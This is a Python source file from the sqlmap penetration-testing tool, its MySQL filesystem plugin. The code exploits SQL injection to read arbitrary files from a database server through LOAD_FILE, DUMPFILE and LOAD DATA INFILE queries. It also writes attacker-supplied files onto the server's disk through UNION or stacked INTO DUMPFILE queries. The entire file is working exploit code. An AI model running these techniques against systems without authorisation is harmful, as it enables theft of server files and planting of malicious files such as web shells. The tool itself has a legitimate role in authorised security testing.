#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.common import singleTimeLogMessage
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import PLACE
from lib.core.exception import sqlmapNoneDataException
from lib.request import inject
from lib.techniques.inband.union.use import unionUse

from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def __init__(self):
        GenericFilesystem.__init__(self)

    def unionReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        result = inject.getValue("SELECT HEX(LOAD_FILE('%s'))" % rFile)

        return result

    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longtext")
        self.getRemoteTempPath()

        tmpFile = "%s/tmpf%s" % (conf.tmpPath, randomStr(lowercase=True))

        debugMsg = "saving hexadecimal encoded content of file '%s' " % rFile
        debugMsg += "into temporary file '%s'" % tmpFile
        logger.debug(debugMsg)
        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (rFile, tmpFile))

        debugMsg = "loading the content of hexadecimal encoded file "
        debugMsg += "'%s' into support table" % rFile
        logger.debug(debugMsg)
        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))

        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=2)

        if length is None or not length.isdigit() or not len(length) or length in ( "0", "1" ):
            errMsg = "unable to retrieve the content of the "
            errMsg += "file '%s'" % rFile
            raise sqlmapNoneDataException, errMsg

        length = int(length)
        sustrLen = 1024

        if length > sustrLen:
            result = []

            for i in range(1, length, sustrLen):
                chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, sort=False, resumeValue=False, charsetType=3)

                result.append(chunk)
        else:
            result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=3)

        return result

    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
        logger.debug("encoding file to its hexadecimal string value")

        fcEncodedList = self.fileEncode(wFile, "hex", True)
        fcEncodedStr = fcEncodedList[0]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "the injection is on a GET parameter and the file "
            warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            warnMsg += "bytes, this might cause errors in the file "
            warnMsg += "writing process"
            logger.warn(warnMsg)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, dFile)
        unionUse(sqlQuery, unpack=False)

        if confirm:
            self.askCheckWrittenFile(wFile, dFile, fileType)

        warnMsg = "expect junk characters inside the "
        warnMsg += "file as a leftover from UNION query"
        singleTimeLogMessage(warnMsg)

    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
        debugMsg = "creating a support table to write the hexadecimal "
        debugMsg += "encoded file to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")

        logger.debug("encoding file to its hexadecimal string value")
        fcEncodedList = self.fileEncode(wFile, "hex", False)

        debugMsg = "forging SQL statements to write the hexadecimal "
        debugMsg += "encoded file to the support table"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("inserting the hexadecimal encoded file to the support table")

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile), silent=True)

        if confirm:
            self.askCheckWrittenFile(wFile, dFile, fileType)
